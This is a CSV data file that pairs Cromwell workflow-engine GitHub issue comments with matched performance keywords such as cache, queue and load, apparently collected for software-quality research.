Performance,"Just a comment when there is a cache _hit_: For intermediate files (outputs of one task going into another), on local and SGE backends, we should not copy the files (symlink or hardlink would be preferred). Just to conserve storage, CPU, and time.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1236#issuecomment-242167982:31,cache,cache,31,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1236#issuecomment-242167982,1,['cache'],['cache']
Performance,"Just adding confirmation that I'm receiving the same error for localizing WDL directories (in the development spec). Notably, if you use the cached-copy strategy, it will result in copying your directories twice - as I understand, Cromwell won't be able to hard-link the original directory so copies it to `cached directory) and hence copies it again. Not a big deal that would get solved by fixes mentioned earlier, but in case anyone finds themselves where I am.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5737#issuecomment-686181004:141,cache,cached-copy,141,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5737#issuecomment-686181004,2,['cache'],"['cached', 'cached-copy']"
Performance,"Just realized that last comment was especially well related how `write_lines` interacts with CC, maybe we can reconsider how CC interprets actual input values vs. Declarations (i.e. if the inputs are the same then any declarations will be the same too, so let's not cache expression results?)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2309#issuecomment-305999959:266,cache,cache,266,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2309#issuecomment-305999959,1,['cache'],['cache']
Performance,"Just to be clear the ""tasks"" referred to here are Slick tasks and not Cromwell / WDL tasks (that error message is produced by the Slick library). I'm speculating a bit but it may be that the unrestricted query was tying up the database for so long that too many tasks backed up behind it and overflowed the Slick task queue of size 1000. More restrictive server-side filtering like you're doing now definitely seems like a good idea. 🙂",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2182#issuecomment-394784516:318,queue,queue,318,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2182#issuecomment-394784516,1,['queue'],['queue']
Performance,"Kate Noblett asked a question, via Slack, about a user who could not view a workflow's details via the FireCloud UI. I first loaded that same workflow in my own browser, then attempted to make a direct API query for that workflow via Rawls. So yes - I was running a query - but it was the same one the end user was making: a specific workflow whose metadata was expensive to calculate.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4093#issuecomment-421397783:125,load,loaded,125,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4093#issuecomment-421397783,1,['load'],['loaded']
Performance,"Let me know if there is any more information that would be useful. Thanks. Workflow Id:. `129f0510-5d6b-4c4c-b266-116a9a52f325`. Step meta data:. ```. {; ""preemptible"": false,; ""executionStatus"": ""Failed"",; ""stdout"": ""gs://broad-gotc-prod-storage/cromwell_execution/PairedEndSingleSampleWorkflow/129f0510-5d6b-4c4c-b266-116a9a52f325/call-CollectQualityYieldMetrics/shard-2/CollectQualityYieldMetrics-2-stdout.log"",; ""backendStatus"": ""Failed"",; ""shardIndex"": 2,; ""outputs"": {. },; ""runtimeAttributes"": {; ""preemptible"": ""0"",; ""failOnStderr"": ""false"",; ""bootDiskSizeGb"": ""10"",; ""disks"": ""local-disk 100 HDD"",; ""continueOnReturnCode"": ""0"",; ""docker"": ""broadinstitute/genomes-in-the-cloud:2.0.0"",; ""cpu"": ""1"",; ""zones"": ""us-central1-c"",; ""memory"": ""2 GB""; },; ""cache"": {; ""allowResultReuse"": true; },; ""inputs"": {; ""disk_size"": ""flowcell_small_disk"",; ""input_bam"": ""unmapped_bam"",; ""metrics_filename"": ""sub(sub(unmapped_bam, sub_strip_path, \""\""), sub_strip_unmapped, \""\"") + \"".unmapped.quality_yield_metrics\""""; },; ""failures"": [{; ""failure"": ""Task 129f0510-5d6b-4c4c-b266-116a9a52f325:CollectQualityYieldMetrics failed: error code 10. Message: 13: VM ggp-12606127296447203756 shut down unexpectedly."",; ""timestamp"": ""2016-04-24T20:04:45.145Z""; }],; ""jobId"": ""operations/EIXH28fEKhisk93Qxr_9-K4BIJ-ikOmeDSoPcHJvZHVjdGlvblF1ZXVl"",; ""backend"": ""JES"",; ""end"": ""2016-04-24T20:04:45.000Z"",; ""stderr"": ""gs://broad-gotc-prod-storage/cromwell_execution/PairedEndSingleSampleWorkflow/129f0510-5d6b-4c4c-b266-116a9a52f325/call-CollectQualityYieldMetrics/shard-2/CollectQualityYieldMetrics-2-stderr.log"",; ""attempt"": 1,; ""executionEvents"": [],; ""backendLogs"": {; ""log"": ""gs://broad-gotc-prod-storage/cromwell_execution/PairedEndSingleSampleWorkflow/129f0510-5d6b-4c4c-b266-116a9a52f325/call-CollectQualityYieldMetrics/shard-2/CollectQualityYieldMetrics-2.log""; },; ""start"": ""2016-04-24T15:50:19.000Z""; }. ```. Log stack trace: . ```; 3589853:2016-04-24 20:04:45,142 cromwell-system-akka.actor.default-dispatcher-16",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/744#issuecomment-215222862:757,cache,cache,757,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/744#issuecomment-215222862,1,['cache'],['cache']
Performance,Let's stash all the data in a GCP Task Queue and pull it in to the DB with a separate service.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2466#issuecomment-316438740:39,Queue,Queue,39,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2466#issuecomment-316438740,1,['Queue'],['Queue']
Performance,Like.$anonfun$run$1(WordSpecLike.scala:1192); at org.scalatest.SuperEngine.runImpl(Engine.scala:521); at org.scalatest.WordSpecLike.run(WordSpecLike.scala:1192); at org.scalatest.WordSpecLike.run$(WordSpecLike.scala:1190); at cromwell.CromwellTestKitWordSpec.run(CromwellTestKitSpec.scala:250); at org.scalatest.tools.Framework.org$scalatest$tools$Framework$$runSuite(Framework.scala:314); at org.scalatest.tools.Framework$ScalaTestTask.execute(Framework.scala:507); at sbt.TestRunner.runTest$1(TestFramework.scala:113); at sbt.TestRunner.run(TestFramework.scala:124); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.$anonfun$apply$1(TestFramework.scala:282); at sbt.TestFramework$.sbt$TestFramework$$withContextLoader(TestFramework.scala:246); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFunction.apply(TestFramework.scala:294); at sbt.Tests$.processRunnable$1(Tests.scala:347); at sbt.Tests$.$anonfun$makeSerial$1(Tests.scala:353); at sbt.std.Transform$$anon$3.$anonfun$apply$2(System.scala:46); at sbt.std.Transform$$anon$4.work(System.scala:67); at sbt.Execute.$anonfun$submit$2(Execute.scala:269); at sbt.internal.util.ErrorHandling$.wideConvert(ErrorHandling.scala:16); at sbt.Execute.work(Execute.scala:278); at sbt.Execute.$anonfun$submit$1(Execute.scala:269); at sbt.ConcurrentRestrictions$$anon$4.$anonfun$submitValid$1(ConcurrentRestrictions.scala:178); at sbt.CompletionService$$anon$2.call(CompletionService.scala:37); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); at java.lang.Thread.run(Thread.java:748); ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-453539593:10024,Concurren,ConcurrentRestrictions,10024,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-453539593,14,"['Concurren', 'concurren']","['ConcurrentRestrictions', 'concurrent']"
Performance,Like.scala:245) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$WithFilter.foreach(TraversableLike.scala:777) ~[cromwell.jar:0.19]; at scala.collection.MapLike$MappedValues.foreach(MapLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$class.map(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.AbstractTraversable.map(Traversable.scala:104) ~[cromwell.jar:0.19]; at cromwell.engine.db.slick.SlickDataAccess$$anonfun$46.apply(SlickDataAccess.scala:569) ~[cromwell.jar:0.19]; at cromwell.engine.db.slick.SlickDataAccess$$anonfun$46.apply(SlickDataAccess.scala:568) ~[cromwell.jar:0.19]; at slick.backend.DatabaseComponent$DatabaseDef$$anonfun$runInContext$1.apply(DatabaseComponent.scala:146) ~[cromwell.jar:0.19]; at slick.backend.DatabaseComponent$DatabaseDef$$anonfun$runInContext$1.apply(DatabaseComponent.scala:146) ~[cromwell.jar:0.19]; at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:251) ~[cromwell.jar:0.19]; at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:249) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run_aroundBody0(Promise.scala:32) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable$AjcClosure1.run(Promise.scala:1) ~[cromwell.jar:0.19]; at org.aspectj.runtime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation$$anonfun$aroundExecution$1.apply(FutureInstrumentation.scala:44) ~[cromwell.jar:0.19]; at kamon.trace.Tracer$.withContext(TracerModule.scala:53) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation.aroundExecution(FutureInstrumentation.scala:43) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:31) ~[cromwell.jar:0.19]; at scala.concurrent.impl.ExecutionContextImpl$AdaptedForkJoinTask.exec(ExecutionContextImpl.scala:121) ~[cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cr,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-215187618:5131,concurren,concurrent,5131,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-215187618,1,['concurren'],['concurrent']
Performance,Look good in the separated perf tests so 👍 from me. @salonishah11 - I'll merge this for you so that I can get started with horizontalling the performance tests.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5036#issuecomment-503651495:142,perform,performance,142,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5036#issuecomment-503651495,1,['perform'],['performance']
Performance,"Looking at the actual SQL above . 1. If possible doing a ""SELECT 1"" (or any other constant) instead of ""SELECT *"" when dealing with EXISTS can be more performance. * requires pulling back all the data from the table for that row, whereas all you're doing is checking for existence. This can make a difference where the WHERE clause is completely satisfied by data within the index being used and the second seek back to the actual data does not need to happen . 2. My only concern is the performance of lots of EXISTS in MySQL. They should be fine, and if this was Oracle I wouldn't worry... but MySQL has proven to be a bit dumb about complex subqueries and don't know if EXISTS would fit into the same bucket. However, this will be proven out during testing... my guess is that if there is a problem it won't be subtle.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4702#issuecomment-469804405:151,perform,performance,151,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4702#issuecomment-469804405,2,['perform'],['performance']
Performance,"Looking at the existing `JobPreparationActor` code I saw that the Docker hash credentials are being created by calling this method in `BackendLifecycleActorFactory`:; ```; def dockerHashCredentials(initializationDataOption: Option[BackendInitializationData]): List[Any] = List.empty; ```; The JES backend overrides this to return a non-empty `List`. Since we don't yet have the required `BackendInitializationData` during workflow materialization, @Horneth suggested the Docker hash calculation be performed slightly downstream in workflow initialization instead.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2048#issuecomment-289156621:498,perform,performed,498,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2048#issuecomment-289156621,1,['perform'],['performed']
Performance,Looking forward to this feature. When enabled the `check-alive` command call via `exit-code-timeout-seconds` currently polls on average once every 10 seconds per running job (under minimum load).,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4220#issuecomment-431870949:189,load,load,189,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4220#issuecomment-431870949,1,['load'],['load']
Performance,"Looking into the failing unit test here, which is passing for me locally. It looks like non-default NIO filesystems aren't getting loaded in the github action test run, though they are locally.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7178#issuecomment-1651859912:131,load,loaded,131,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7178#issuecomment-1651859912,1,['load'],['loaded']
Performance,"Looks awesome to me. Thinking out loud.....:. - (PO q) If a hash lookup fails (i.e. I mean the dockerhub request, not the expression evaluation), not even starting the workflow might be the expected behaviour, because ""don't waste my money starting an entire analysis when in 2 minutes I can resubmit and get CC""?; - (Separate ticket?) Should we also have a ""disable docker hash cache"" option, for Lee's very-fast iterations? Or just a ""clear hash cache"" REST endpoint?; - ToL: The hash lookup cache may also need to be aware of local vs remote hashes; - ToL: one step further away from dynamic backend assignment 😢",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2048#issuecomment-283975797:379,cache,cache,379,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2048#issuecomment-283975797,3,['cache'],['cache']
Performance,Looks good delta some final feedback incorporation and a performance test on alpha.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4702#issuecomment-469900089:57,perform,performance,57,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4702#issuecomment-469900089,1,['perform'],['performance']
Performance,"Looks good to me. I tried to make some sense of this compiler error this morning. One thing to note is that `sbt compile` does work, but it's the assembly that seems to be creating the issues. Judging from the output of `sbt assembly`, I think perhaps it could be a conflict with another library, because it seems to have the error immediately after importing a bunch of JARs:. ```; ...; [info] Including: jackson-jaxrs-json-provider-2.4.1.jar; [info] Including: jackson-module-jsonSchema-2.4.1.jar; [info] Including: jackson-jaxrs-base-2.4.1.jar; [error] missing or invalid dependency detected while loading class file 'WorkflowStatusResponse.class'.; [error] Could not access type AnyRef in package scala,; [error] because it (or its dependencies) are missing. Check your build definition for; [error] missing or conflicting dependencies. (Re-run with `-Ylog-classpath` to see the problematic classpath.); [error] A full rebuild may help if 'WorkflowStatusResponse.class' was compiled against an incompatible version of scala.; [error] missing or invalid dependency detected while loading class file 'WorkflowSubmitResponse.class'.; [error] Could not access type AnyRef in package scala,; [error] because it (or its dependencies) are missing. Check your build definition for; [error] missing or conflicting dependencies. (Re-run with `-Ylog-classpath` to see the problematic classpath.); [error] A full rebuild may help if 'WorkflowSubmitResponse.class' was compiled against an incompatible version of scala.; [error] two errors found; [error] (test:compileIncremental) Compilation failed; [error] Total time: 32 s, completed Jun 2, 2015 8:39:34 AM; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/30#issuecomment-107940395:601,load,loading,601,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/30#issuecomment-107940395,2,['load'],['loading']
Performance,"Looks like Chris has suggested some substantial changes, will wait to review when those land (avoid race condition)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6158#issuecomment-763891981:100,race condition,race condition,100,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6158#issuecomment-763891981,1,['race condition'],['race condition']
Performance,"Looks like Travis caches' deletion doesn't solve the problem with centaurHoricromtalEngineUpgradePapiV2 builds (BA-6164). There're still errors like `ERROR: for cromwell-summarizer-plus-backend Container ""dcdaaee217fb"" is unhealthy.`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5340#issuecomment-571829738:18,cache,caches,18,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5340#issuecomment-571829738,1,['cache'],['caches']
Performance,"Looks like there is a test that's guarding against my change. I believe this test is incorrect, but I'll leave that confirmation to you (maybe @cjllanwarne as it looks like you wrote the original test):. [`ValueEvaluatorSpec.scala#L538-L542`](https://github.com/broadinstitute/cromwell/blob/50f28da6a665526c1bdb1d5528400ee9deeaa5d4/wdl/model/draft2/src/test/scala/wdl/expression/ValueEvaluatorSpec.scala#L538-L542); ```scala; ""Optional values"" should ""fail to perform addition with the + operator if the argument is None"" in {; val hello = WomString(""hello ""); val noneWorld = WomOptionalValue.none(WomStringType); hello.add(noneWorld) should be(Failure(OptionalNotSuppliedException(""+""))); }; ```. Relevant text from original PR:. The [WDL Spec: _Interpolating and concatenating optional strings_](https://github.com/openwdl/wdl/blob/master/versions/development/SPEC.md#interpolating-and-concatenating-optional-strings). > Within interpolations, string concatenation with the + operator has special typing properties to facilitate formulation of command-line flags. [...] If either operand has an optional type, then the concatenation has type String?, and the runtime result is None if either operand is None",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5583#issuecomment-661974971:460,perform,perform,460,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5583#issuecomment-661974971,1,['perform'],['perform']
Performance,"Managed to fix the problem. Cromwell 32 errorred and explained the problem. The filesystem section was moved to the SGE section. Are config file now looks like this:; ```HOCON; backend {; default=""SGE""; providers {; SGE {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; concurrent-job-limit = 10000; runtime-attributes= """"""; Int? cpu=1; Int? memory=4; """"""; submit = """"""; qsub \; -terse \; -V \; -b n \; -wd ${cwd} \; -N ${job_name} \; ${'-pe BWA ' + cpu} \; ${'-l h_vmem=' + memory + ""G""} \; -o ${out} \; -e ${err} \; ${script}; """"""; kill = ""qdel ${job_id}""; check-alive = ""qstat -j ${job_id}""; job-id-regex = ""(\\d+)"". filesystems {; local {; localization: [; ""soft-link"", ""copy"", ""hard-link""; ]; caching {; duplication-strategy: [ ""soft-link"", ""copy"", ""hard-link"" ]; hashing-strategy: ""file""; }; }; }; }; }; }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3109#issuecomment-402984197:320,concurren,concurrent-job-limit,320,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3109#issuecomment-402984197,1,['concurren'],['concurrent-job-limit']
Performance,Merging with caveats:; - sbt tests are passing; - aws centaur is using an old queue; - other centaurs are failing due to expected and excessive logging. None of this is expected to negatively affect production,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5982#issuecomment-718140957:78,queue,queue,78,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5982#issuecomment-718140957,1,['queue'],['queue']
Performance,"More info on this--there is no region in the cromwell config file, and us-west-2 is specified in ~/.aws/config. Also us-east does not occur in any of the WDLs or json files. So I believe cromwell is _supposed_ to use whatever's set in ~/.aws/config. . Here's an example of where the metadata says the region is us-east-1:. ```; ""runtimeAttributes"": {; ""failOnStderr"": ""false"",; ""queueArn"": ""arn:aws:batch:us-west-2:xxx:job-queue/cromwell-1999"",; ""disks"": ""local-disk /cromwell_root"",; ""continueOnReturnCode"": ""0"",; ""docker"": ""quay.io/fhcrc-microbiome/picard:2.20.1"",; ""maxRetries"": ""1"",; ""cpu"": ""4"",; ""cpuMin"": ""1"",; ""noAddress"": ""false"",; ""zones"": ""us-east-1a"",; ""memoryMin"": ""2 GB"",; ""memory"": ""4 GB""; },; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4974#issuecomment-492893146:379,queue,queueArn,379,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4974#issuecomment-492893146,2,['queue'],"['queue', 'queueArn']"
Performance,"More people are using the JG server to launch multiple workflows w/ jobs on the order of 10k and it's being slow to start those jobs. There's definitely something going on w/ memory still but one explanation is also that jobs are being queued and throttled in Cromwell to respect quota for submission which is good, but if we have tens of thousands it might take some time to start them. Jose submitted a 40k jobs workflow and aborted it almost immediately and it got me thinking that *if* they were in that queue they would still be submitted.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2750#issuecomment-336873648:236,queue,queued,236,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2750#issuecomment-336873648,3,"['queue', 'throttle']","['queue', 'queued', 'throttled']"
Performance,"More precisely, come up with a mechanism that ; 1) Gets all ""workflow-related"" actors to stop doing more work and make sure all DB write operations have been sent to ensure consistency.; 2) Waits for all DB write actors to empty their queue; 3) Shuts down the JVM",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2373#issuecomment-316154937:235,queue,queue,235,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2373#issuecomment-316154937,1,['queue'],['queue']
Performance,"Much better performance, 8-fold improvement. <img width=""1253"" alt=""Screen Shot 2019-07-31 at 5 15 50 PM"" src=""https://user-images.githubusercontent.com/50877414/62248953-5a7c6680-b3b7-11e9-9b28-393c8a9202a8.png"">",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5093#issuecomment-517025325:12,perform,performance,12,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5093#issuecomment-517025325,1,['perform'],['performance']
Performance,"My ""test"" right now is the following code in a Scala worksheet:; ```; import scala.concurrent.{ExecutionContext, Future}. implicit val ec = ExecutionContext.global. val x = Future(throw new Exception(""hello world"")). val y = x.map(_ => println(""wasd""))(ec); .recover { case a: Throwable => println(""Exception was: "" + a.getMessage) }(ec); ```; which prints; ```; Exception was: hello world; ```; I'm working on figuring out how construct this in situ in a way that meaningfully tests something.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5022#issuecomment-501411862:83,concurren,concurrent,83,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5022#issuecomment-501411862,1,['concurren'],['concurrent']
Performance,"NE.N_SamToFastqAndBwaMem:0)); > 2020-11-07 17:54:51,673 cromwell-system-akka.dispatchers.backend-dispatcher-7385 WARN - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-BackendCacheHitCopyingActor-0123c178:GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:-1:1-5 [UUID(0123c178)GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:NA:1]: Unrecognized runtime attribute keys: preemptible; > 2020-11-07 17:54:51,674 cromwell-system-akka.dispatchers.engine-dispatcher-38 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:NA:1 [UUID(0123c178)]: Call cache hit process had 0 total hit failures before completing successfully; > 2020-11-07 17:54:51,674 cromwell-system-akka.dispatchers.engine-dispatcher-33 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Could not copy a suitable cache hit for 0123c178:GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1. EJEA attempted to copy 1 cache hits before failing. Of these 1 failed to copy and 0 were already blacklisted from previous attempts). Falling back to running job. As you can see, some small tasks worked but large tasks failed. > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807:1890,cache,cache,1890,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807,1,['cache'],['cache']
Performance,"New theory: I believe this is seen just before every ""deadlock"" failure. ```java; Exception in thread ""db-2"" java.lang.IllegalArgumentException: requirement failed: count cannot be increased; at scala.Predef$.require(Predef.scala:277); at slick.util.ManagedArrayBlockingQueue.$anonfun$increaseInUseCount$1(ManagedArrayBlockingQueue.scala:43); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at slick.util.ManagedArrayBlockingQueue.locked(ManagedArrayBlockingQueue.scala:201); at slick.util.ManagedArrayBlockingQueue.increaseInUseCount(ManagedArrayBlockingQueue.scala:42); at slick.util.AsyncExecutor$$anon$2$$anon$1.beforeExecute(AsyncExecutor.scala:117); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1146); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); at java.lang.Thread.run(Thread.java:748); ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4328#issuecomment-439187592:696,concurren,concurrent,696,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4328#issuecomment-439187592,2,['concurren'],['concurrent']
Performance,"No. The feature is due to a script that monitors disk storage and mounts; new disks into a btrfs filesystem. This isn’t standard for ECS. On Tue, Jul 21, 2020 at 4:08 PM Richard Davison <notifications@github.com>; wrote:. > @markjschreiber <https://github.com/markjschreiber>; >; > The EC2 workers contain a script that automatically expands that mount; > users don't need to set that up. No custom AMI is required, in theory any; > AMI that can work with ECS could be used.; >; > Is this a new feature of all new ECS Optimized Amazon Linux instances?; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/pull/5468#issuecomment-662080007>,; > or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EM4MI3WWXI2AFZAK2LR4XYUHANCNFSM4LW5UP3A>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5468#issuecomment-662153993:518,Optimiz,Optimized,518,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5468#issuecomment-662153993,1,['Optimiz'],['Optimized']
Performance,"Not critical but just very annoying as we have to set read and write from; cache to false to use the script. On Wed, Oct 31, 2018 at 8:24 AM Thib <notifications@github.com> wrote:. > Thanks for bringing this up. How critical is this bug for your usage ?; > Chances are we're not going to have the bandwidth to fix it in the near; > future unless it's really blocking a critical use case.; >; > —; > You are receiving this because you authored the thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/4330#issuecomment-434667203>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/Ao_T2CWzUKe-JlOs5tmFY-0-f-KJR3-4ks5uqZZkgaJpZM4X_RGI>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4330#issuecomment-434703401:75,cache,cache,75,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4330#issuecomment-434703401,1,['cache'],['cache']
Performance,"Not it isn't, I believe @mcovarr is working on something that should make this ""go away"". ; In the meantime you can try to increase `database.db.queueSize` in the configuration. Results are not guaranteed though it's just giving slick more room but it might still fail. The default is 1000.; Also how big is your workflow ? Must be large to hit this.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2219#issuecomment-298055093:145,queue,queueSize,145,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2219#issuecomment-298055093,1,['queue'],['queueSize']
Performance,"Not super urgent, but yes I agree. Ideally we would have access to each of the hashes that get hash cached so we could compare them later to see if things changed (i.e. file hashes, other input hashes, docker image hashes, etc)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1629#issuecomment-256449537:100,cache,cached,100,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1629#issuecomment-256449537,1,['cache'],['cached']
